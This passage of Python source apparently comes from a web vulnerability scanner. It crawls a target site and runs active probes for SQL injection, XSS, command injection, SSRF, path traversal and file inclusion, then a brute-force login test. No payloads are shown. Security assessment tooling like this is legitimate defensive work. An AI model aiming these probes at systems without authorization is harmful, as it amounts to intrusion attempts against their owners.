    if auth_settings.get("http_enabled") and auth_settings.get("username"):
        session.auth = HTTPBasicAuth(auth_settings.get("username"), auth_settings.get("password", ""))

    return session


def _default_value_for_input(name: str, form_inputs: dict) -> str:
    if not name:
        return ""
    key = name.lower()
    if "email" in key:
        return form_inputs.get("email", "test@example.com")
    if "user" in key or "login" in key:
        return form_inputs.get("username", "testuser")
    if "pass" in key:
        return form_inputs.get("password", "P@ssw0rd!")
    if "first" in key:
        return form_inputs.get("first_name", "Test")
    if "last" in key:
        return form_inputs.get("last_name", "User")
    if "phone" in key:
        return form_inputs.get("phone", "0000000000")
    return "test"


def run_blackbox_scan(
    target_url,
    settings,
    issue_callback=None,
    progress_callback=None,
    status_callback=None,
):
    """Run crawler + vulnerability scanner with settings."""
    start_time = time.time()
    session = _build_session(settings)
    crawler = WebCrawler(
        base_url=target_url,
        settings=settings,
        session=session,
        issue_callback=issue_callback,
        progress_callback=progress_callback,
        status_callback=status_callback,
    )
    discovered_urls = crawler.crawl()
    forms = crawler.discovered_forms

    scanner = VulnerabilityScanner(
        settings=settings,
        session=session,
        issue_callback=issue_callback,
        progress_callback=progress_callback,
        status_callback=status_callback,
    )

    issues = []
    total = max(len(discovered_urls), 1)
    form_inputs = settings.get("form_inputs", {})

    for idx, url in enumerate(discovered_urls):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        simple_params = {k: (v[0] if isinstance(v, list) and v else "") for k, v in params.items()}

        issues.extend(scanner.test_sql_injection(url, simple_params, method="GET"))
        issues.extend(scanner.test_blind_sql_injection(url, simple_params, method="GET"))
        issues.extend(scanner.test_xss(url, simple_params, method="GET"))
        issues.extend(scanner.test_path_traversal(url, simple_params, method="GET"))
        issues.extend(scanner.test_command_injection(url, simple_params, method="GET"))
        issues.extend(scanner.test_open_redirect(url, simple_params, method="GET"))
        issues.extend(scanner.test_ssrf(url, simple_params, method="GET"))
        issues.extend(scanner.test_file_inclusion(url, simple_params, method="GET"))

        if progress_callback:
            progress_callback(int((idx + 1) / total * 100))

    for form in forms:
        action = form.get("action") or target_url
        method = form.get("method", "GET").upper()
        params = {}
        for inp in form.get("inputs", []):
            name = inp.get("name", "")
            params[name] = inp.get("value") or _default_value_for_input(name, form_inputs)
        issues.extend(scanner.test_sql_injection(action, params, method=method))
        issues.extend(scanner.test_blind_sql_injection(action, params, method=method))
        issues.extend(scanner.test_xss(action, params, method=method))
        issues.extend(scanner.test_path_traversal(action, params, method=method))
        issues.extend(scanner.test_command_injection(action, params, method=method))

    # Passive checks on target root
    issues.extend(scanner.test_sensitive_data_disclosure(target_url))
    issues.extend(scanner.test_directory_listing(target_url))
    issues.extend(scanner.test_robots_txt(target_url))
    issues.extend(scanner.test_sitemap(target_url))
    issues.extend(scanner.test_web_server_info(target_url))
    issues.extend(scanner.test_security_headers(target_url))
    issues.extend(scanner.test_cms_detection(target_url))
    issues.extend(scanner.test_ssl_tls(target_url))
    issues.extend(scanner.test_brute_force(target_url))

    return {
        "target": target_url,
        "issues": issues,
        "urls_crawled": len(discovered_urls),
        "forms_found": len(forms),
        "duration": time.time() - start_time,
    }

